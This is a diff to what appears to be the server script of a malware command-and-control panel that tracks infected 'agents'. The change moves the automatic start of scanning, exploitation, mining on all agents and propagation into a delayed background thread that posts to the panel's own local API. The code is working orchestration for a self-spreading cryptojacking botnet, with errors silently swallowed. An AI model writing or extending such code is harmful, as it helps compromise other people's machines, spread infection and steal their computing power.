@@ -6038,30 +6038,35 @@ def main():
             db.commit()
             print(f"[*] {agent_count} agents marked ONLINE")
         
-        # Auto-start operations on server startup
-        print("[*] Auto-starting operations...")
-        with app.test_client() as client:
-            # Start scan
+        # Auto-start operations in background thread (delayed for WebSocket)
+        def auto_start_operations():
+            import time
+            time.sleep(5)  # Wait for WebSocket connections
+            print("[*] Auto-starting operations...")
             try:
-                client.post('/api/exploitation/scan')
+                # Start scan
+                requests.post(f'http://127.0.0.1:{args.port}/api/exploitation/scan', timeout=5)
                 print("[*] ✓ Scan started")
             except: pass
-            # Start exploit
             try:
-                client.post('/api/exploitation/exploit')
+                # Start exploit
+                requests.post(f'http://127.0.0.1:{args.port}/api/exploitation/exploit', timeout=5)
                 print("[*] ✓ Exploit started")
             except: pass
-            # Start mining
             try:
-                client.post('/api/mining/start-all')
+                # Start mining
+                requests.post(f'http://127.0.0.1:{args.port}/api/mining/start-all', timeout=5)
                 print("[*] ✓ Mining started")
             except: pass
-            # Start propagation
             try:
-                client.post('/api/propagation/start')
+                # Start propagation
+                requests.post(f'http://127.0.0.1:{args.port}/api/propagation/start', timeout=5)
                 print("[*] ✓ Propagation started")
             except: pass
-        print("[*] ✓ All operations auto-started")
+            print("[*] ✓ All operations auto-started")
+        
+        import threading
+        threading.Thread(target=auto_start_operations, daemon=True).start()
     except Exception as e:
         print(f"[!] Auto-init error: {e}")
     
